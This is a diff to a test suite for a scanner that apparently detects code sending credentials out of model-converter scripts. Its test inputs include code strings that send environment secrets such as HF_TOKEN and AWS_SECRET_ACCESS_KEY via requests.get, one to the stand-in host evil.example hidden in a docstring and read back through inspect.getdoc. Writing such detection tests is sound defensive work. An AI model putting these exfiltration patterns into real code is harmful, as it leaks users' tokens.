@@ -3490,6 +3490,22 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'if os.getenv("HF_TOKEN"):\n'
         + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     ) == []
+
+    # The key can be a keyword. Calling that dynamic refused a legitimate
+    # download, which is the false positive this narrowing exists to remove.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'if os.environ.get(key = "HF_TOKEN"):\n'
+        + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'other = os.environ.get(key = "AWS_SECRET_ACCESS_KEY")\n'
+            + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+            + ' "b": other})\n'
+        )
+    ]
     # getattr with a computed name on the file's OWN objects is upstream's
     # shape and must stay readable.
     assert scan_converter_source(
@@ -3695,6 +3711,22 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             'requests.get(vars(fetch)[key] + os.environ["HF_TOKEN"])\n'
         )
     ]
+    # inspect.getdoc and pydoc.getdoc read it with none of those names
+    # present at all, which is why the rule is introspection rather than a
+    # list of spellings of __doc__.
+    for reader in ('inspect.getdoc(fetch)', 'pydoc.getdoc(fetch)'):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\n'
+                'import requests\n'
+                'import inspect\n'
+                'import pydoc\n'
+                'HUB = "https://huggingface.co"\n'
+                'def fetch():\n'
+                '    """https://evil.example/collect"""\n'
+                f'requests.get({reader}, params = {{"t": os.environ["HF_TOKEN"]}})\n'
+            )
+        ], reader
     # And a bare string statement is not a docstring.
     assert [
         f.check for f in scan_converter_source(
@@ -4004,6 +4036,16 @@ def test_the_hub_allowance_reads_the_real_hostname():
     started = time.perf_counter()
     assert _reshaped(chain + 'url = v1499.replace("huggingface.co", "evil.example")\n')
     assert time.perf_counter() - started < 10
+
+    # The chain itself is what forces the passes, so the assignments are
+    # collected once rather than walked again per pass: 10000 of them, 203 KB,
+    # took about two seconds that way on a file the scan accepts at up to 8 MiB.
+    long_chain = 'v0 = BASE\n' + "".join(
+        f'v{i} = v{i - 1} + "/x"\n' for i in range(1, 10_000)
+    )
+    started = time.perf_counter()
+    _reshaped(long_chain)
+    assert time.perf_counter() - started < 5
 
     # What comes BACK from the hub is not a URL. Upstream writes exactly this,
     # and carrying the taint through the call refused the file the allowance
